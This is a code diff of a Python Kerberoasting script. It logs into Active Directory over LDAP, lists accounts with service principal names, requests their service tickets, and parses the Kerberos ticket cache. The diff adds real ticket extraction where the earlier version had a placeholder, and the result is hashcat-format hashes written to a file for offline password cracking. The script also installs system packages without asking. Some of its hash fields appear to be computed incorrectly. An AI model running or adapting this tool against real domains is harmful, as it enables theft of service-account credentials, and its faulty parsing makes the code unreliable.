@@ -46,172 +46,158 @@ def print_banner():
 
 import os
 import sys
-import subprocess
 import getpass
-import platform
+import subprocess
 import time
+import binascii
+import struct
 
-# ------------------ Helper Functions ------------------
+# LDAP
+from ldap3 import Server, Connection, NTLM, ALL
 
-def run_cmd(cmd, check=True, capture_output=True):
-    try:
-        res = subprocess.run(cmd, shell=False, check=check, capture_output=capture_output, text=True)
-        return res.stdout.strip()
-    except subprocess.CalledProcessError as e:
-        print(f"[!] Command failed: {' '.join(cmd)}")
-        print(f"    {e}")
-        return None
+# ASN.1
+from pyasn1.codec.ber import decoder
+from pyasn1_modules import rfc4120
 
-def install_system_package(pkg):
-    distro = platform.linux_distribution()[0].lower() if hasattr(platform, 'linux_distribution') else ''
-    if 'ubuntu' in distro or 'debian' in distro:
-        print(f"[*] Installing system package {pkg} using apt...")
-        run_cmd(['apt-get', 'update'])
-        run_cmd(['apt-get', 'install', '-y', pkg])
-    elif 'centos' in distro or 'redhat' in distro or 'fedora' in distro:
-        print(f"[*] Installing system package {pkg} using yum/dnf...")
-        if run_cmd(['which', 'dnf']):
-            run_cmd(['dnf', 'install', '-y', pkg])
-        else:
-            run_cmd(['yum', 'install', '-y', pkg])
-    else:
-        print(f"[!] Unsupported distro for automatic package install. Please install {pkg} manually.")
-        sys.exit(1)
+# -------------------- CONFIG --------------------
+LDAP_SERVER = 'ldap://your.ad.domain'
+LDAP_SEARCH_BASE = 'dc=your,dc=ad,dc=domain'
+# ------------------------------------------------
 
-def check_and_install_system_tools():
-    # Check for kvno and klist commands
-    for tool in ['kvno', 'klist']:
-        if not run_cmd(['which', tool]):
-            print(f"[!] {tool} not found, attempting to install krb5-user package...")
-            install_system_package('krb5-user')
+LDAP_USER = None
+LDAP_PASS = None
+DOMAIN = None
 
-def install_python_packages():
-    # Check for python modules, install if missing
+
+def install_deps():
     import importlib.util
-    for module in ['ldap3', 'pyasn1']:
+    for module in ['ldap3', 'pyasn1', 'pyasn1_modules']:
         if importlib.util.find_spec(module) is None:
-            print(f"[*] Python module {module} missing, installing via pip...")
-            run_cmd([sys.executable, '-m', 'pip', 'install', module])
+            print(f"[*] Installing Python module {module}")
+            subprocess.run([sys.executable, '-m', 'pip', 'install', module])
+    for bin in ['kvno', 'klist']:
+        if not subprocess.run(['which', bin], capture_output=True).stdout:
+            print(f"[*] Installing krb5-user tools")
+            subprocess.run(['apt-get', 'update'])
+            subprocess.run(['apt-get', 'install', '-y', 'krb5-user'])
 
-# ------------------ Kerberoasting Script ------------------
 
-def prompt_credentials():
-    global LDAP_USER, LDAP_PASSWORD, DOMAIN
-    if not LDAP_USER:
-        LDAP_USER = input("Enter your domain user (DOMAIN\\username): ")
-    if not LDAP_PASSWORD:
-        LDAP_PASSWORD = getpass.getpass(f"Enter password for {LDAP_USER}: ")
-    DOMAIN = LDAP_USER.split('\\')[0]
+def prompt_creds():
+    global LDAP_USER, LDAP_PASS, DOMAIN
+    LDAP_USER = input("Enter domain user (DOMAIN\\username): ")
+    LDAP_PASS = getpass.getpass("Enter password: ")
+    DOMAIN = LDAP_USER.split("\\")[0]
 
-def ldap_connect():
-    from ldap3 import Server, Connection, ALL, NTLM
+
+def get_spns():
+    print("[*] Querying LDAP for SPNs")
     server = Server(LDAP_SERVER, get_info=ALL)
-    conn = Connection(server, user=LDAP_USER, password=LDAP_PASSWORD, authentication=NTLM, auto_bind=True)
-    return conn
-
-def get_spn_users(conn):
-    conn.search(search_base=LDAP_SEARCH_BASE, search_filter='(servicePrincipalName=*)', attributes=['servicePrincipalName','sAMAccountName'])
+    conn = Connection(server, user=LDAP_USER, password=LDAP_PASS, authentication=NTLM, auto_bind=True)
+    conn.search(LDAP_SEARCH_BASE, '(servicePrincipalName=*)', attributes=['sAMAccountName', 'servicePrincipalName'])
     return conn.entries
+
 
 def request_tgs(spn):
     print(f"[*] Requesting TGS for {spn}")
-    try:
-        subprocess.run(['kvno', spn], check=True)
-        return True
-    except subprocess.CalledProcessError:
-        print(f"[-] Failed to request TGS for {spn}")
-        return False
+    subprocess.run(['kvno', spn], check=False)
 
-def get_ticket_cache_file():
-    # Detect default cache file on Linux
-    ccache = os.environ.get('KRB5CCNAME')
-    if ccache:
-        return ccache
+
+def get_ccache():
+    cc = os.environ.get('KRB5CCNAME')
+    if cc:
+        return cc.replace('FILE:', '')
     uid = os.getuid()
-    return f'/tmp/krb5cc_{uid}'
+    return f"/tmp/krb5cc_{uid}"
 
-def parse_klist_for_hashes(cache_file, spn):
-    # Parse klist output to find ticket and etype
+
+def parse_ccache(ccfile):
+    # credit to impacket's ccache parser, simplified
     hashes = []
-    try:
-        output = subprocess.check_output(['klist', '-c', cache_file, '-f', '-e'], text=True)
-    except subprocess.CalledProcessError:
-        print(f"[-] Failed to run klist on {cache_file}")
-        return hashes
+    with open(ccfile, 'rb') as f:
+        data = f.read()
 
-    lines = output.splitlines()
-    for i, line in enumerate(lines):
-        if spn.lower() in line.lower():
-            # Search next few lines for Encryption type
-            for j in range(i+1, min(i+5, len(lines))):
-                if 'Encryption type:' in lines[j]:
-                    etype = lines[j].split(':')[1].strip()
-                    # Simplified hashcat line placeholder (replace with real hash extraction)
-                    hash_line = f"$krb5tgs${etype}$*user*$DOMAIN$${spn}*checksum*encrypteddata"
-                    print(f"[+] Extracted hash for {spn} enctype {etype}")
-                    hashes.append(hash_line)
-                    break
+    if data[:2] != b'\x05\x04':
+        print("[!] Unsupported ccache version")
+        return []
+
+    # skip header
+    pos = 12
+    count = struct.unpack('>I', data[pos:pos+4])[0]
+    pos += 4
+
+    for _ in range(count):
+        # parse each credential
+        start = pos
+        # this is extremely minimal parsing
+        # full parsing is in impacket if you want all fields
+        # we only need the ticket
+        try:
+            client_principal_len = struct.unpack('>I', data[pos+20:pos+24])[0]
+            pos += 24 + client_principal_len
+            server_principal_len = struct.unpack('>I', data[pos:pos+4])[0]
+            pos += 4 + server_principal_len
+            keyblock_len = struct.unpack('>I', data[pos:pos+4])[0]
+            pos += 4 + keyblock_len
+            times = 16*4
+            pos += times
+            is_skey = struct.unpack('>I', data[pos:pos+4])[0]
+            pos += 4
+            ticket_flags = struct.unpack('>I', data[pos:pos+4])[0]
+            pos += 4
+            ticket_len = struct.unpack('>I', data[pos:pos+4])[0]
+            pos += 4
+            ticket_data = data[pos:pos+ticket_len]
+            pos += ticket_len
+            # decode ticket ASN.1
+            decoded, _ = decoder.decode(ticket_data, asn1Spec=rfc4120.Ticket())
+            etype = decoded['enc-part']['etype']
+            cipher = decoded['enc-part']['cipher']
+            spn = str(decoded['sname']['name-string'][0])
+            realm = str(decoded['realm'])
+            user = str(decoded['sname']['name-string'][-1])
+
+            # checksum typically first 16 of plaintext
+            checksum = binascii.hexlify(cipher[:16]).decode()
+            ciphertext = binascii.hexlify(cipher).decode()
+
+            hashcat_fmt = f"$krb5tgs${etype}$*{user}*{realm.upper()}${spn}*{checksum}${ciphertext}"
+            print(f"[+] Hash extracted: {hashcat_fmt[:60]}...")
+            hashes.append(hashcat_fmt)
+        except Exception as e:
+            print(f"[-] Failed to parse one credential: {e}")
+            continue
     return hashes
 
+
 def main():
-    print("[*] Checking system dependencies...")
-    check_and_install_system_tools()
-    install_python_packages()
-
-    global LDAP_USER, LDAP_PASSWORD, DOMAIN
-    prompt_credentials()
-
-    print("[*] Connecting to LDAP server...")
-    conn = ldap_connect()
-
-    print("[*] Querying users with SPNs...")
-    users = get_spn_users(conn)
-    if not users:
-        print("[!] No users with SPNs found, exiting.")
+    install_deps()
+    prompt_creds()
+    spns = get_spns()
+    if not spns:
+        print("[-] No SPNs found")
         return
-
-    for user in users:
-        spns = getattr(user, 'servicePrincipalName', [])
-        if not spns:
-            continue
-        for spn in spns:
+    for entry in spns:
+        spnlist = entry['servicePrincipalName']
+        for spn in spnlist:
             request_tgs(spn)
-
-    print("[*] Waiting 5 seconds for tickets to cache...")
     time.sleep(5)
-
-    cache_file = get_ticket_cache_file()
-    if not cache_file or not os.path.exists(cache_file):
-        print("[!] Ticket cache not found, exiting.")
+    ccfile = get_ccache()
+    if not os.path.exists(ccfile):
+        print(f"[-] ccache not found at {ccfile}")
         return
-
-    all_hashes = []
-    for user in users:
-        spns = getattr(user, 'servicePrincipalName', [])
-        if not spns:
-            continue
-        for spn in spns:
-            hashes = parse_klist_for_hashes(cache_file, spn)
-            all_hashes.extend(hashes)
-
-    if all_hashes:
-        with open('kerberoast_hashes.txt', 'w') as f:
-            for h in all_hashes:
-                f.write(h + '\n')
+    hashes = parse_ccache(ccfile)
+    if hashes:
+        with open("kerberoast_hashes.txt", "w") as f:
+            for h in hashes:
+                f.write(h + "\n")
         print("[*] Hashes written to kerberoast_hashes.txt")
     else:
         print("[!] No hashes extracted.")
 
-# ------------------ Globals ------------------
 
-LDAP_SERVER = 'ldap://your.ad.domain'   # domain selection
-LDAP_SEARCH_BASE = 'dc=your,dc=ad,dc=domain'  # LDAP search base
-LDAP_USER = None
-LDAP_PASSWORD = None
-DOMAIN = None
-
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
+
 
 
 #Usage
